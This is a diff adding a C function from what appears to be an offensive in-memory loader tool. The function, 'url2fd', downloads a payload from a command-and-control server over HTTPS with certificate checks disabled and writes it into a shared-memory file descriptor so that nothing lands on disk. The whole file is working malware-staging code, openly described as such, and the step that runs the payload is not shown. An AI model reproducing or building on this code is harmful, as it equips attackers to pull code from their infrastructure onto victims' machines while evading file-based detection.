@@ -1,0 +1,44 @@
+#include "zdownloader.h"
+
+// Download payload from a C&C via HTTPs
+// TODO: refactor
+int url2fd(char *downloadUrl, Shared_Mem_Fd * smf) { 
+
+	CURL *curl;
+	CURLcode res;
+
+	log_info("RamWorker: File Descriptor %d Shared Memory created", smf->shm_fd);
+	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);
+
+    // TODO: parameterize to HTTP/HTTPS/etc.
+    // TODO: test HTTPS, check cert validation
+    curl_global_init(CURL_GLOBAL_DEFAULT);    
+	curl = curl_easy_init();
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, downloadUrl);
+		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
+       
+        // WARNING: fdopen(3) The result of applying fdopen() to a shared memory object is undefined. 
+        // So far works but TODO: test across platforms. Most likely file semantics are preserved
+        // but the behavior is undefined due to fcntl things like SEALS
+        smf->shm_file = fdopen(smf->shm_fd, "w"); 
+        if ( smf->shm_file == NULL ){
+			log_error("cURL: fdopen() failed");
+            return 0;
+        }
+
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, smf->shm_file); 
+		
+		res = curl_easy_perform(curl);
+		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
+			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
+            return 0;
+		}
+		curl_easy_cleanup(curl);
+		return 1;
+	}
+
+    return 0;
+}
